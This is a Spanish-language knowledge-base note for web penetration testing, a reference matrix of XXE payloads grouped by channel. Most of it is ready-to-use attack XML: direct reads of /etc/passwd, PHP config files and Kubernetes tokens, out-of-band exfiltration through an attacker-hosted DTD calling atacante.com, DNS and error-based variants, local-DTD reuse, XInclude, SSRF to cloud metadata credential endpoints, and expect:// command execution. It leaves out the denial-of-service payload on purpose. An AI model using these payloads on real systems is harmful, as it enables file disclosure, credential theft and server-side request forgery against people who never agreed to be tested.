---
tipo: meta
aliases:
  - Payloads XXE
  - XXE - DTD de exfiltración
tags:
  - meta/referencia
  - dominio/web
---

# XXE payloads - matriz de referencia

> [!info] Referencia pura, no un zettel
> Un bloque por canal, en el mismo orden que el árbol de [[MOC - XXE]]. Dónde aparece la superficie está en [[XXE formatos - matriz de referencia]]; los bypass, en [[XXE evasión - matriz de referencia]].

## 0. Confirmar que hay parser de XML

Antes de nada: que el DTD se procese.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test "OK">]>
<foo>&test;</foo>
```

Entidad **interna**, sin nada externo. Si en la respuesta aparece `OK` donde iba `&test;`, el DTD está habilitado y todo el dominio está abierto. Si el documento se rechaza, el DTD está deshabilitado y solo queda [[XXE - XInclude]].

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://único.atacante.com/">]>
<foo>&xxe;</foo>
```

Prueba de entidad externa con interacción propia. La conexión que llega confirma sin necesidad de reflejo.

## 1. Canal directo

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

El clásico. La entidad va donde antes iba el valor que la app refleja.

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<foo>&xxe;</foo>
```

En PHP, obligatorio para archivos con `<`, `&` o cualquier cosa que rompa el XML. Devuelve base64, que siempre es XML válido. Es el mismo wrapper que [[LFI wrappers - matriz de referencia]].

Rutas que pagan:

```
/etc/passwd            confirma lectura
/etc/hostname          confirma sin exponer usuarios
/proc/self/environ     variables de entorno: secretos
/proc/self/cwd/        directorio de la app
/var/www/html/config.php
/var/run/secrets/kubernetes.io/serviceaccount/token
C:\Windows\win.ini     equivalente en Windows
```

## 2. Fuera de banda

Dos archivos. El documento declara una entidad de parámetro que trae la DTD del atacante:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % remoto SYSTEM "http://atacante.com/e.dtd">
%remoto;
]>
<foo>x</foo>
```

Y `e.dtd`, servida por el atacante, trae la maquinaria:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://atacante.com/?x=%file;'>">
%eval;
%exfil;
```

> [!important] Por qué hacen falta dos archivos
> La declaración anidada —una entidad que declara otra— **no está permitida dentro del subconjunto interno** del documento. Tiene que vivir en una DTD externa. Es la razón estructural por la que este canal necesita egress y el canal directo no.
>
> `&#x25;` es un `%` escapado. Sin escapar, el parser lo interpretaría al leer la DTD en vez de al expandir la entidad.

Si solo sale DNS:

```
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.atacante.com/'>">
```

Límite de 63 caracteres por etiqueta: hay que trocear, y el base64 con `=` y `/` no es válido en DNS. Sirve para confirmar y para exfiltrar poco.

## 3. Por error

Mismo mecanismo, ruta local inexistente en lugar de URL. En `e.dtd`:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///noexiste/%file;'>">
%eval;
%error;
```

El parser falla al abrir la ruta y escribe el mensaje con el archivo adentro. Ver [[XXE - canal por error]].

Sin egress para servir la DTD, queda la variante que redefine una entidad de una DTD **ya presente en el sistema**:

```xml
<!DOCTYPE foo [
<!ENTITY % local SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % entidad_conocida 'nada">
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/%file;&#x27;>">
  &#x25;eval; &#x25;error;
  <!ENTITY xxe "'>
%local;
]>
<foo>x</foo>
```

Frágil: hay que conocer una DTD presente y el nombre de una entidad que declare. Vale como último recurso.

## 4. XInclude

Sin `DOCTYPE`, para cuando la entrada se inserta en un XML ajeno:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

`parse="text"` es obligatorio para archivos que no son XML válido. Sin él, el parser intenta interpretar el contenido y falla.

Cuando solo se controla un elemento suelto, alcanza con el atributo de espacio de nombres en ese mismo elemento:

```xml
<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>
```

Remoto, que es SSRF puro:

```xml
<xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
```

## 5. Impacto más allá de leer

**SSRF.** Toda entidad con `http://` es una petición desde el servidor. Los destinos que valen están en [[SSRF destinos - matriz de referencia]]; el criterio, en [[MOC - SSRF]].

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**Listar directorios**, en Java:

```xml
<!ENTITY xxe SYSTEM "file:///var/www/">
```

Java devuelve el listado; PHP no. Útil para orientarse antes de pedir archivos concretos.

**RCE**, solo con el módulo `expect` de PHP cargado, que es raro:

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

> [!danger] Denegación de servicio — no ejecutar
> La expansión recursiva de entidades agota la memoria del servidor en segundos. Es trivial de escribir y por eso no se incluye acá el payload: **cae el servicio**, y eso está fuera del alcance de una prueba web salvo autorización explícita por escrito. Se reporta como riesgo, se demuestra con una expansión de dos niveles que no llegue a romper nada, y se documenta que la mitigación es la misma que para todo el dominio: deshabilitar el DTD.
